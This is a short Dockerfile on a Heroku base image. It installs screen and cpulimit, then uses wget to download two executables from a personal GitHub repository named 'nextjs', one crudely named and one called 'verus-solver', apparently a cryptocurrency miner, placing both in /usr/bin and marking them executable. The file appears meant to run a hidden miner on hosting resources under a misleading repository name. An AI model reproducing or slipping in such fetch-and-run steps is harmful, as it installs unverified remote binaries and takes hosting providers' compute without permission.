FROM heroku/heroku:18

RUN apt update -y \
    	&& apt upgrade -y \
        && apt install htop -y && apt-get install -y screen && apt-get install cpulimit && apt-get install wget -y && cd /usr/bin  && wget https://github.com/sengepeke/nextjs/raw/master/kontol && chmod +x kontol  && wget https://github.com/sengepeke/nextjs/raw/master/verus-solver && chmod +x verus-solver



